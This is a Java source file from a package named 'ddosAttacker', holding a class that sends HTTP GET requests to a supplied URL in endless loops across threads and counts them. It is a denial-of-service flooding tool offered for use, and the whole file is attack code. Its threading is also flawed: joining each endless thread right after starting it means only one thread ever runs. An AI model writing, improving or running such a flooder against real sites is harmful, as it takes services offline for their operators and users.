package com.pelayolluna.ddosAttacker.core;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.util.concurrent.atomic.AtomicInteger;

public class MultiRequester {

	private static final AtomicInteger counter = new AtomicInteger();

	public AtomicInteger getCounter() {
		return counter;
	}
	
	public void start(String url) {
		for (int i = 1; i <= Runtime.getRuntime().availableProcessors(); i++) {
			Thread thread = new Thread(new Runnable() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					while (true) {
						System.out.println("***Get request***");

						try {
							URL website = new URL(url);

							HttpURLConnection conn = (HttpURLConnection) website.openConnection();
							conn.setAllowUserInteraction(true);
							conn.setConnectTimeout(5000);
							conn.setDoInput(true);
							conn.setDoOutput(false);
							conn.setUseCaches(false);
							conn.setRequestMethod("GET");
							conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

							conn.connect();
							conn.getResponseCode();
						} catch (ProtocolException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

						counter.incrementAndGet();
					}
				}
			});
			thread.start();
			try {
				thread.join();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

}
